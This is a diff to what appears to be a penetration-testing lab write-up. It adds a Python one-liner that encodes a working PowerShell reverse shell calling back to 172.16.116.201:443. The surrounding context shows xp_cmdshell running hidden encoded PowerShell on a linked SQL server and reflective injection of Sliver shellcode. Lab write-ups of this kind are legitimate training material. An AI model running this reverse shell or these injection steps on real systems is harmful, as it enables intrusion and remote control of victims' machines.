@@ -276,6 +276,18 @@ port `53` over the linked-server `xp_cmdshell`:
 EXECUTE ('EXECUTE AS LOGIN = ''adm''; EXEC xp_cmdshell ''powershell -nop -W hidden -noni -ep bypass -enc <obfuscated>''') AT [SQL07.IT-IFRIT.VL];
 ```
 
+And to generate the powershell revershell, the following one liner is used
+
+```python3 title="Python3 one liner to generate a encoded revershell"
+
+python3 -c "
+import base64
+cmd = '\$T=New-Object Net.Sockets.TCPClient(\'172.16.116.201\',443);\$N=\$T.GetStream();\$W=New-Object IO.StreamWriter(\$N);function W(\$S){[byte[]]\$script:B=0..\$T.ReceiveBufferSize|%{0};\$W.Write(\$S+\'SHELL> \');\$W.Flush()};W \'\';while((\$R=\$N.Read(\$B,0,\$B.Length)) -gt 0){\$C=([text.encoding]::UTF8).GetString(\$B,0,\$R-1);\$O=try{iex \$C 2>&1|Out-String}catch{\$_|Out-String};W \$O};\$W.Close()'
+print(base64.b64encode(cmd.encode('utf-16-le')).decode())
+"
+
+```
+
 **Step 2 — reflectively load the beacon.** From that shell, pull the raw Sliver
 **shellcode** over HTTP and inject it into the current process with
 `VirtualAlloc` (RWX, `0x3000/0x40`) + `Marshal.Copy` + `CreateThread`. Nothing is
